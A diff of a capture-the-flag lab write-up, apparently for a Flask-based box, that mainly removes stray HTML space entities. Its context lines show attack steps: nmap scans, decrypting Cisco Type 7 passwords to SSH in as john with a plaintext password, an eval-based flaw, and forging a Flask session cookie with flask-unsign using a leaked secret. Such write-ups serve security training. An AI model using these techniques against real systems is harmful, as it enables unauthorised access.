@@ -16,7 +16,7 @@ PORT      STATE    SERVICE
 20202/tcp open     ipdtp-port
 ```
 
-Ran a detailed scan on the unknown ports.&#x20;
+Ran a detailed scan on the unknown ports.
 
 ```
 $ sudo nmap -p 5555,20202 -sC -sV --min-rate 3000 192.168.201.141       
@@ -34,7 +34,7 @@ PORT      STATE SERVICE VERSION
 |_http-title: Site doesn't have a title (text/html; charset=utf-8).
 ```
 
-Based on the box name, we are likely dealing with a Flask application here.&#x20;
+Based on the box name, we are likely dealing with a Flask application here.
 
 ### Web Enum -> JWT Exploit
 
@@ -135,7 +135,7 @@ At the bottom, we can see users making posts about the configuration files:
 
 <figure><img src="../../../.gitbook/assets/image (1623).png" alt=""><figcaption></figcaption></figure>
 
-This step took forever, but I eventually found the config file at `cisco_config`.&#x20;
+This step took forever, but I eventually found the config file at `cisco_config`.
 
 <figure><img src="../../../.gitbook/assets/image (3831).png" alt=""><figcaption></figcaption></figure>
 
@@ -145,7 +145,7 @@ These are Cisco Type 7 passwords, which can be decrypted here:
 
 We can then try each password with `ssh`, finding that `john:NezukoCh@n` works.
 
-&#x20;
+
 
 <figure><img src="../../../.gitbook/assets/image (1640).png" alt=""><figcaption></figcaption></figure>
 
@@ -223,7 +223,7 @@ def div(a, b):
         return str(eval("%s / %s" % (a, b)))
 ```
 
-Since we have the Flask secret, we can create a cookie to bypass this since it only checks for the `logged_in` parameter.&#x20;
+Since we have the Flask secret, we can create a cookie to bypass this since it only checks for the `logged_in` parameter.
 
 ```
 $ flask-unsign --sign --cookie "{'logged_in': True}" --secret 'Fl@sKy_Sup3R_S3cR3T'   
